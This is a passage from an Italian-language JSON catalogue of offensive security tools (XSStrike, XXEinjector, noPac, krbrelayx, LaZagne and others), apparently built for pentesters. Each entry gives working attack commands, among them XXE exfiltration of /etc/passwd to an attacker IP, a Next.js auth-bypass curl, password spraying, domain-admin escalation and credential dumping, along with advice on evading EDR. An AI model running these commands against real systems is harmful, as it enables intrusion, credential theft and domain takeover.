e scan intero sito\npython3 xsstrike.py -u \"https://target.com\" --crawl</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Bug Bounty & Web Pentest:</strong> Quando scanner generici falliscono, XSStrike trova XSS complessi (es. DOM-based o in contesti JS difficili) riducendo i falsi positivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico malevolo (tag script, eventi on*) che i WAF bloccano. Supporta delay e proxy per mitigare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "xxeinjector",
    "name": "XXEinjector",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/enjoiz/XXEinjector",
    "desc": "Tool automatico per sfruttare vulnerabilità XXE (XML External Entity): estrazione file (OOB), enumerazione porte e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XXEinjector è un framework Ruby per automatizzare attacchi XXE complessi. Gestisce la creazione di server locali (HTTP/FTP) per ricevere dati esfiltrati via Out-Of-Band (OOB) channels, essenziale quando l'XXE è \"blind\" (non mostra output nella risposta). Supporta protocolli multipli (SOAP, XML-RPC, REST).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>OOB Exfiltration:</strong> Avvia server per catturare file inviati dal target via DTD injection.</p><p><strong>Port Scanning:</strong> Può usare l'XXE per scansionare la rete interna del server (SSRF via XXE).</p><p><strong>PHP Expect:</strong> Tenta RCE se il wrapper <code>expect://</code> è abilitato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di salvare la richiesta HTTP vulnerabile in un file.</p><pre><code># Attacco Blind OOB per leggere /etc/passwd\nruby XXEinjector.rb --host=attacker_ip --path=/etc/passwd --file=req.txt --proxy=127.0.0.1:8080 --oob=http</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Exploitation di endpoint XML (es. SAML, SOAP) vulnerabili. L'OOB è spesso l'unico modo per dimostrare l'impatto critico di una Blind XXE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il server target effettuerà connessioni in uscita verso l'IP dell'attaccante (OOB). Questo traffico è spesso bloccato o loggato dai firewall egress.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XXE"
    ],
    "notes": null
  },
  {
    "id": "poc-cve-2025-29927",
    "name": "PoC CVE-2025-29927",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per bypass autorizzazione middleware in Next.js tramite manipolazione header (x-middleware-subrequest).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo Proof of Concept dimostra una vulnerabilità critica in Next.js (CVE-2025-29927) che permette di aggirare i controlli di sicurezza implementati nel middleware. Inserendo uno specifico header interno (<code>x-middleware-subrequest</code>) nella richiesta HTTP, un attaccante può ingannare l'applicazione facendole credere che la richiesta provenga da un componente interno fidato, saltando così le verifiche di autenticazione o autorizzazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Middleware Bypass:</strong> Neutralizza le regole di sicurezza definite nel middleware (es. redirect al login, check permessi) per accedere direttamente a route protette.</p><p><strong>Header Injection:</strong> Costruisce richieste con l'header <code>x-middleware-subrequest</code> valorizzato in modo da matchare il nome del middleware interno, forzando il bypass.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Utilizzare curl o lo script Python per inviare la richiesta manipolata.</p><pre><code># Accesso a /admin bypassando auth\ncurl -H \"x-middleware-subrequest: middleware\" http://target.com/admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web App Assessment:</strong> Cruciale per testare applicazioni React/Next.js recenti. Se il middleware gestisce l'authz, questo exploit garantisce accesso amministrativo o ai dati utente senza credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La presenza dell'header <code>x-middleware-subrequest</code> in richieste esterne è un indicatore di attacco certo. Facile da filtrare a livello di reverse proxy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Next_js"
    ],
    "notes": null
  },
  {
    "id": "cnvd-2020-10487-tomcat-ajp-lfi",
    "name": "CNVD-2020-10487-Tomcat-Ajp-lfi",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
    "desc": "Exploit PoC per vulnerabilità \"Ghostcat\" in Apache Tomcat (AJP connector) che permette lettura file e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta la vulnerabilità Ghostcat (CVE-2020-1938 / CNVD-2020-10487) presente nel protocollo AJP di Apache Tomcat. Il connettore AJP (porta 8009) è spesso abilitato di default e si fida di tutti i pacchetti in arrivo. L'exploit permette a un attaccante non autenticato di leggere file di configurazione o codice sorgente dalla webapp (Local File Inclusion) o, se è possibile l'upload di file, di ottenere Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LFI via AJP:</strong> Invia pacchetti AJP malformati per forzare il server a processare file arbitrari (come <code>WEB-INF/web.xml</code>) come se fossero pagine JSP, rivelando password o configurazioni sensibili.</p><p><strong>RCE Potential:</strong> Se l'attaccante può caricare un file (anche un'immagine) sul server, questo exploit può forzare Tomcat a includerlo ed eseguirlo come codice malevolo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e l'IP del target (porta 8009).</p><pre><code># Lettura del file web.xml (default)\npython2 exploit.py 192.168.1.10\n\n# Lettura di un file specifico\npython2 exploit.py 192.168.1.10 -f WEB-INF/classes/application.properties</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Molto comune in <strong>Internal Pentest</strong>, dove la porta 8009 non è filtrata dai firewall interni. Spesso permette di ottenere credenziali database dai file di configurazione estratti, portando alla compromissione totale dell'applicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Traffico sulla porta 8009 è sospetto se non proviene da un reverse proxy noto. IDS rilevano le firme Ghostcat standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Tomcat"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-linux-amd64",
    "name": "kerbrute_linux_amd64",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool Go per enumerazione utenti e password spraying veloce tramite Kerberos Pre-Auth, evitando blocchi account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute è lo strumento standard per enumerare validi account Active Directory e testare password in modo furtivo. Sfrutta il fatto che il KDC (Key Distribution Center) risponde diversamente alle richieste di pre-autenticazione per utenti inesistenti rispetto a quelli esistenti, permettendo di validare liste di username enormi molto velocemente senza generare log di \"Logon Failure\" (Event 4625) classici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enum Stealth:</strong> Valida l'esistenza degli utenti analizzando gli errori Kerberos, invisibile a policy di lockout standard.</p><p><strong>Password Spraying:</strong> Esegue tentativi di accesso distribuiti (una password per tutti gli utenti) verificando le credenziali direttamente contro il DC via porta 88.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Non richiede dominio joinato, solo visibilità di rete.</p><pre><code># Enumerazione utenti validi\n./kerbrute userenum -d lab.local --dc 192.168.1.5 users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d lab.local users.txt \"Summer2024!\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Recon:</strong> Il primo passo in un internal pentest black-box per pulire la lista di potenziali username prima di attaccarli, o per ottenere il primo accesso valido tramite spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera Event ID 4771 (Kerberos Pre-Auth Failed). Defender for Identity rileva facilmente volumi alti di queste richieste.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "krbrelayx",
    "name": "krbrelayx",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/krbrelayx",
    "desc": "Toolkit per attacchi di coercizione e relay Kerberos (LDAP/SMB) per scalare privilegi su Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>KrbRelayX è una suite di strumenti progettata per sfruttare vulnerabilità logiche nel protocollo Kerberos e nelle configurazioni di delega. Permette di intercettare autenticazioni Kerberos forzate (tramite tecniche di coercizione come PrinterBug o PetitPotam) e inoltrarle (Relay) verso altri servizi, tipicamente LDAP, per creare nuovi account macchina o modificare attributi sensibili (RBCD).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Kerberos Relaying:</strong> A differenza del relay NTLM, il relay Kerberos è possibile in specifici scenari (es. uPnP non patchato o cross-protocol). Permette di ottenere privilegi SYSTEM su computer target o modificare owner di oggetti AD.</p><p><strong>DCSync via Relay:</strong> Se si riesce a rilanciare l'autenticazione di un DC verso LDAP, è possibile eseguire abuse di ACL per preparare un attacco DCSync.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede coordinazione tra listener e trigger di coercizione.</p><pre><code># Avvio listener relay verso LDAP per creare computer account\npython3 krbrelayx.py -t ldaps://dc01.local\n\n# Innesco coercizione (da altro terminale/tool)\npython3 printerbug.py domain/user:pass@target_ip listener_ip</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation avanzata:</strong> Usato quando NTLM relay è mitigato (SMB Signing). Permette di passare da accesso di rete a Domain Admin sfruttando un server non patchato che accetta connessioni in entrata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di account macchina anomali o modifiche RBAC sono loggate. Le tecniche di coercizione (RPC pipes) sono monitorate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "nopac",
    "name": "noPac",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ridter/noPac",
    "desc": "Exploit tool per CVE-2021-42278 e CVE-2021-42287 (sAMAccountName spoofing) che permette Privilege Escalation a Domain Admin.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>NoPac (o sam-the-admin) sfrutta due vulnerabilità nella gestione Kerberos degli account macchina. Rinominando un account macchina (che l'utente può creare/gestire) per matchare il nome di un Domain Controller, richiedendo un TGT, e poi rinominandolo indietro, è possibile ottenere un Service Ticket valido per il DC come se fossimo amministratori. Il risultato è l'accesso come Domain Admin istantaneo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Privilege Escalation:</strong> Da utente standard (con quota machine account > 0) a Domain Admin in pochi secondi.</p><p><strong>DCSync:</strong> Spesso integra la funzionalità di dump degli hash (DCSync) subito dopo l'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python (Impacket based).</p><pre><code># Exploit chain per ottenere shell come SYSTEM sul DC\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -shell\n\n# Solo dump hash\npython3 noPac.py domain.local/user:pass -dc-ip 192.168.1.5 -dump</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest:</strong> Se il dominio non è patchato (patch fine 2021), questo è il metodo più veloce per compromettere l'intero dominio partendo da un utente low-privilege.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rinominare account macchina (sAMAccountName change) più volte in pochi secondi è un IoC molto forte rilevato da MDI.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pkinittools",
    "name": "PKINITtools",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dirkjanm/PKINITtools",
    "desc": "Toolkit Python per manipolare l'autenticazione Kerberos PKINIT (Certificate-based) e ottenere TGT/NTLM hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PKInitTools è una suite (che include <code>gettgtpkinit.py</code>) per interagire con la pre-autenticazione Kerberos basata su certificati (PKINIT). È fondamentale per sfruttare vulnerabilità in Active Directory Certificate Services (ADCS). Permette di richiedere un Ticket Granting Ticket (TGT) usando un certificato PFX (rubato o generato maliziosamente) e, successivamente, recuperare l'hash NTLM dell'account associato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth via Certificato:</strong> Autenticarsi al dominio senza password, usando solo un certificato valido e la sua chiave privata.</p><p><strong>Unpac the Hash:</strong> Una volta ottenuto il TGT via PKINIT, permette di recuperare la chiave di sessione e l'hash NTLM dell'utente, tecnica nota come \"Unpacking\".</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Tipico workflow ADCS exploitation.</p><pre><code># Richiesta TGT con certificato PFX\npython3 gettgtpkinit.py -cert-pfx user.pfx -pfx-pass password domain/user ccache_file\n\n# Recupero hash NTLM dal TGT (se si possiede la chiave)\npython3 getnthash.py -key <AS-REP-KEY> domain/user</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>ADCS Exploitation:</strong> Se si sfrutta una vulnerabilità come ESC1 o ESC8 per ottenere un certificato amministrativo, questo tool è il ponte per trasformare quel certificato in un accesso Kerberos utilizzabile o in un hash per il cracking/pass-the-hash.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di PKINIT genera eventi specifici (4768 con PreAuthType 16 o 15). Se l'utente non usa smartcard abitualmente, è molto sospetto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "pywhisker",
    "name": "pywhisker",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ShutdownRepo/pywhisker",
    "desc": "Tool Python per sfruttare vulnerabilità \"Shadow Credentials\" (Key Trust Account) in AD e prendere controllo di account utente/computer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PyWhisker sfrutta l'attributo <code>msDS-KeyCredentialLink</code> introdotto per Windows Hello for Business. Se un attaccante ha diritti di scrittura su questo attributo di un oggetto AD (es. tramite deleghe generiche), può iniettare una propria chiave pubblica (\"Shadow Credential\"). Questo permette di autenticarsi come quell'utente/computer usando PKINIT e ottenere un TGT, bypassando completamente la password dell'account.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Key Injection:</strong> Genera un certificato self-signed e aggiunge la chiave pubblica all'attributo target.</p><p><strong>TGT Acquisition:</strong> Usa la chiave privata associata per richiedere un TGT al KDC.</p><p><strong>Persistence:</strong> Tecnica eccellente per backdooring stealth, poiché non cambia la password dell'utente e l'attributo è raramente monitorato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script (parte di ThePorgs suite).</p><pre><code># Iniezione Shadow Credential su target\npython3 pywhisker.py -d domain.local -u atacante -p pass -t target_user --action \"add\"\n\n# Autenticazione con certificato generato\npython3 gettgtpkinit.py ... (usando il pfx generato da pywhisker)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation & Persistence:</strong> Se si scopre di avere diritti <code>GenericWrite</code> o <code>WriteProperty</code> su un Domain Admin o un DC, PyWhisker trasforma quel permesso in compromissione totale in modo silenzioso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modifiche a <code>msDS-KeyCredentialLink</code> generano eventi di Directory Service Change (5136), ma sono spesso ignorati. Defender for Identity inizia a rilevare queste anomalie.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerberos-windows-scripts",
    "name": "kerberos_windows_scripts",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerberos_windows_scripts",
    "desc": "Collezione di script Bash per interagire con Kerberos (kinit, klist, rpc) da Linux senza dipendenze pesanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo repository (spesso associato a ropnop o risorse simili) fornisce un set di script Bash leggeri per gestire l'autenticazione Kerberos direttamente da un terminale Linux (es. Kali o una macchina compromessa). Permette di richiedere ticket (TGT/TGS), listare la cache e interagire con servizi RPC senza dover installare suite pesanti come Impacket, sfruttando i binari nativi <code>krb5-user</code>.</p><br><hr><h4 class=\"rt-purple\">Script principali</h4><p><strong>kinit wrappers:</strong> Script per automatizzare la richiesta di TGT con password o keytab, gestendo automaticamente la configurazione del realm in <code>krb5.conf</code> se necessario.</p><p><strong>Ticket Management:</strong> Utility per visualizzare (<code>klist</code> wrapper), rinnovare o distruggere ticket nella cache, essenziale per passare da un'identità compromessa all'altra.</p><p><strong>RPC Interaction:</strong> Helper per usare <code>rpcclient</code> con autenticazione Kerberos (flag <code>-k</code>) sfruttando il ticket in cache per enumerazione SMB/RPC stealth.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire gli script dalla shell dopo aver installato i client krb5.</p><pre><code># Autenticazione e ottenimento TGT\n./init_krb.sh user@DOMAIN.LOCAL Password123\n\n# Enumerazione RPC usando il ticket\nrpcclient -k dc01.domain.local -c \"enumdomusers\"</code></pre><p>La variabile d'ambiente <code>KRB5CCNAME</code> viene spesso gestita per puntare al ticket corretto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per scenari <strong>Living off the Land</strong> su server Linux compromessi che sono già joinati al dominio (es. server web SSSD). Permette di usare l'identità della macchina o di un utente compromesso per muoversi lateralmente senza caricare tool esterni sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che il pacchetto <code>krb5-user</code> sia installato. Il traffico Kerberos verso il DC è legittimo, ma l'uso anomalo (es. troppi TGT request) può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "kerbrute",
    "name": "kerbrute",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool per enumerazione utenti e password spraying via Kerberos Pre-Auth, stealth rispetto ai log di login classici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos (porta 88 UDP/TCP) per validare username e testare password. Poiché la pre-autenticazione Kerberos avviene prima del login SMB/RPC, questo metodo è molto più veloce e genera meno eventi di sicurezza critici (4625) rispetto ai metodi tradizionali. È lo strumento d'elezione per attacchi di password spraying in ambienti AD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Distingue tra utenti validi e non validi basandosi sui codici di errore Kerberos, permettendo di pulire liste di username sporche.</p><p><strong>Lockout Safe Spray:</strong> In modalità spray (una password, molti utenti), il rischio di bloccare account è minimo se usato correttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Binario Go standalone (Linux/Windows/Mac).</p><pre><code># Enumerazione utenti da lista\n./kerbrute userenum --dc 10.0.0.1 -d domain.local users.txt\n\n# Password Spraying\n./kerbrute passwordspray -d domain.local users.txt \"Welcome123\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Network Pentest:</strong> Per ottenere il primo accesso valido (Initial Access) testando password comuni (StagioneAnno!) contro tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Monitorato da Defender for Identity (MDI) che rileva picchi di traffico AS-REQ. Usare con cautela.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "dehashed",
    "name": "Dehashed",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Motore di ricerca e intelligence per credenziali compromesse e asset nel deep web, interrogabile via web o API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DeHashed è una piattaforma di data mining e intelligence che indicizza miliardi di asset compromessi provenienti da breach pubblici e privati. A differenza di semplici checker, permette ricerche avanzate (wildcard, regex) su email, username, password, hash, indirizzi IP e nomi fisici. È uno strumento fondamentale per la fase di ricognizione passiva (OSINT) e per arricchire i dati durante un engagement, permettendo di trasformare un singolo indicatore (es. un'email) in un profilo completo di credenziali potenzialmente valide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Search Query:</strong> Supporta operatori complessi per filtrare i risultati. È possibile cercare tutte le password associate a un dominio specifico (<code>domain:target.com</code>) o trovare utenti che hanno utilizzato una password specifica (<code>password:\"Company2023!\"</code>), utile per identificare pattern di riutilizzo.</p><p><strong>Breach Monitoring:</strong> Permette di monitorare asset aziendali in tempo reale, ricevendo alert quando nuove credenziali relative al proprio dominio appaiono in dump o leak nel dark web.</p><p><strong>Hash Cracking (Lookup):</strong> Il database contiene spesso sia l'hash che la password in chiaro decifrata da leak precedenti, risparmiando tempo di cracking costoso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accessibile via interfaccia web o API (per integrazione con tool come <code>DeHashed-API-Wrapper</code> o <code>Maltego</code>).</p><pre><code># Esempio query web per trovare credenziali admin\nemail:admin@target.com AND password:*\n\n# Ricerca inversa da un hash NTLM trovato\nhash:8846F7EAEE8FB117AD06BDD830B7586C\n\n# Ricerca ampia su dominio escludendo sottodomini noise\ndomain:target.com AND NOT email:support@*</code></pre><p>I risultati possono essere esportati in JSON/CSV per analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>OSINT & Recon</strong>, fornisce la \"benzina\" per attacchi di Credential Stuffing o Password Spraying senza inviare un singolo pacchetto verso il bersaglio. In <strong>Incident Response</strong>, aiuta a verificare se le credenziali di un utente compromesso erano già presenti in breach storici (es. Collection #1) o se sono frutto di un attacco recente (es. InfoStealer malware).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attività è totalmente <strong>passiva</strong>. Nessuna interazione avviene con i sistemi del target, rendendo questa fase invisibile ai difensori aziendali.</p><p><strong>Impatto operativo:</strong> Nessuno sui sistemi target. Tuttavia, maneggiare database di credenziali reali richiede rispetto delle normative privacy e policy di engagement etico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "dehashed-py",
    "name": "dehashed.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python wrapper per interrogare le API di DeHashed.com da riga di comando, per credential harvesting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script funge da interfaccia CLI per il motore di ricerca DeHashed. Invece di usare l'interfaccia web, permette di eseguire query massive direttamente dal terminale, scaricando dump di credenziali compromesse (email, username, password, hash) in formato JSON o testo. È progettato per essere integrato in pipeline di ricognizione automatica o script di OSINT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Query:</strong> Accetta liste di domini o email e interroga le API sequenzialmente, gestendo la paginazione dei risultati.</p><p><strong>Output Parsing:</strong> Filtra automaticamente i risultati \"spazzatura\" e formatta l'output per essere passato direttamente a tool di password cracking (es. estraendo solo gli hash) o spraying.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una API Key valida configurata.</p><pre><code># Ricerca credenziali per un dominio\npython3 dehashed.py -d target.com -o results.json\n\n# Ricerca inversa da hash\npython3 dehashed.py -q \"hash:5f4dcc3b5aa765d61d8327deb882cf99\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT Automatica:</strong> Inserito in uno script bash che gira ogni notte, può monitorare nuovi leak relativi ai domini dei clienti e allertare il team di sicurezza proattivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo (traffico verso DeHashed, non verso il target). Gestire con cura i file di output contenenti PII e password reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "firefox-decrypt-main",
    "name": "firefox_decrypt-main",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/unode/firefox_decrypt",
    "desc": "Script Python per estrarre e decifrare password salvate nei profili Mozilla (Firefox, Thunderbird) anche con Master Password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Firefox Decrypt è uno strumento forense in grado di leggere i database dei profili Mozilla (file <code>logins.json</code> e <code>key4.db</code>) per estrarre le credenziali salvate. Funziona su profili Firefox, Thunderbird e derivati. Se è impostata una Master Password, lo script chiede l'input utente per derivare la chiave di decifratura, rendendolo efficace anche contro profili protetti se si conosce la password principale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform:</strong> Funziona su profili copiati da Windows, Linux o Mac, poiché il formato database Mozilla è standard.</p><p><strong>Thunderbird Support:</strong> Oltre ai siti web, recupera password IMAP/SMTP/POP3 dai client di posta, spesso critiche per il movimento laterale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Puntare lo script alla cartella del profilo.</p><pre><code># Scansione automatica path default\npython3 firefox_decrypt.py\n\n# Decifratura profilo esportato\npython3 firefox_decrypt.py /tmp/profilo_vittima/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Workstation:</strong> Dopo aver compromesso un PC, esfiltrare la cartella del profilo Firefox e decifrarla offline permette di ottenere accessi a portali web interni, VPN SSL e webmail.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso ai file del profilo mentre il browser è aperto può fallire. Operazione locale di lettura file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "lazagne-2-4-7",
    "name": "LaZagne",
    "version": "2.4.7",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/AlessandroZ/LaZagne",
    "desc": "Tool forense/offensivo all-in-one per recuperare password salvate localmente da browser, chat, database, wifi e sysadmin tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LaZagne è un'applicazione post-exploitation open source utilizzata per recuperare le molteplici password che gli utenti salvano quotidianamente sul proprio computer. Supporta Windows, Linux e macOS. Il tool scansiona il file system e il registro alla ricerca di credenziali memorizzate da browser, client di posta, database manager, strumenti di amministrazione (es. Putty, WinSCP) e configurazioni WiFi, decifrandole quando possibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Supporto Multi-Software:</strong> Include decine di moduli specifici per estrarre password da Chrome, Firefox, Outlook, Thunderbird, FileZilla, PuTTY, OpenSSH, VNC, Network Manager e molti altri.</p><p><strong>Decifratura Locale:</strong> Utilizza le API di sistema (come DPAPI su Windows o GNOME Keyring su Linux) o algoritmi noti per decifrare le password offuscate trovate nei file di configurazione.</p><p><strong>Esecuzione in Memoria:</strong> Su Windows, può essere caricato riflessivamente o eseguito come standalone senza dipendenze Python esterne (usando la versione compilata PyInstaller), facilitando l'uso su macchine compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare l'eseguibile da riga di comando. Senza argomenti tenta tutti i moduli.</p><pre><code># Esecuzione completa (Tutti i moduli)\nlazagne.exe all\n\n# Solo browser e output su file\nlazagne.exe browsers -oN -o output.txt\n\n# Specifico per WiFi (richiede Admin)\nlazagne.exe wifi</code></pre><p>Su Linux/Mac: <code>python3 laZagne.py all</code>. I risultati vengono stampati a video e possono essere salvati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong> su una workstation compromessa, LaZagne è spesso il passo più veloce per ottenere credenziali per muoversi lateralmente (es. password di root del database salvata in un client SQL, o chiave SSH privata non protetta da passphrase). Essenziale per dimostrare il rischio del salvataggio password nei browser.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La maggior parte degli antivirus ed EDR rileva LaZagne basandosi sulla firma dell'eseguibile o sul comportamento (accesso massivo a file di configurazione browser/mail). L'uso della DPAPI genera eventi di sistema.</p><p><strong>Mitigazioni:</strong> Non usare l'EXE standard. Eseguire tramite Python se presente sul target, o ricompilare/offuscare il codice. Eseguire solo moduli specifici necessari per ridurre il rumore.</p><br><hr>",
    "best_in": false,
